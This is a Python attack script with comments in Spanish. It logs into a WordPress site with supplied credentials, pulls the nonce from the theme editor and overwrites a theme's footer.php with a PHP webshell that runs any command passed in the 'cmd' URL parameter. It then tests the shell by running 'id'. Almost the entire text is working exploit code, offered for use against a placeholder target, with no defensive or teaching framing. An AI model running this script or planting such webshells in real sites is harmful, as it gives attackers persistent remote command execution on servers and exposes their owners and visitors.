#!/usr/bin/env python3
"""
WordPress Theme Editor RCE - Inyecta una webshell en el footer.php de un tema
a traves del editor de temas integrado. Requiere credenciales WP validas con
acceso al editor.

Uso: python3 wordpress-theme-editor-rce.py
  - Configurar TARGET, USERNAME, PASSWORD y THEME antes de ejecutar.
"""
import requests, re

requests.packages.urllib3.disable_warnings()

TARGET = "https://TARGET_HOST"
USERNAME = "USERNAME"
PASSWORD = "PASSWORD"
THEME = "theme-name"

s = requests.Session()
s.verify = False

s.get(TARGET + "/wp-login.php")
r = s.post(TARGET + "/wp-login.php", data={
    "log": USERNAME,
    "pwd": PASSWORD,
    "wp-submit": "Log In",
    "redirect_to": TARGET + "/wp-admin/",
    "testcookie": "1",
})
print("[login]", r.status_code)

r = s.get(TARGET + f"/wp-admin/theme-editor.php?file=footer.php&theme={THEME}")

m_num = re.search(r'id="nonce"\s+name="nonce"\s+value="(\d+)"', r.text)
m_str = re.search(r'"nonce":"([a-f0-9]+)"', r.text)

nonce = None
if m_num:
    nonce = m_num.group(1)
elif m_str:
    nonce = m_str.group(1)

if not nonce:
    print("[!] nonce no encontrado, abortando")
    exit(1)

print("[+] nonce:", nonce)

new_content = """<!-- contenido original del footer aca -->
<?php wp_footer(); ?>
</body>
</html>
<?php if(isset($_GET['cmd'])){ echo '<pre>'; system($_GET['cmd']); echo '</pre>'; } ?>
"""

r = s.post(TARGET + "/wp-admin/theme-editor.php", data={
    "newcontent": new_content,
    "action": "update",
    "file": "footer.php",
    "theme": THEME,
    "nonce": nonce,
    "submit": "Update File",
    "scrollto": "0",
})
print("[save]", r.status_code)
if "cannot be edited" in r.text or "rsaquo; Error" in r.text:
    print("[!] fallo el guardado")
else:
    print("[+] guardado correctamente")

r = s.get(TARGET + "/?cmd=id")
m = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
print("[webshell test]", m.group(1) if m else "no encontrado")
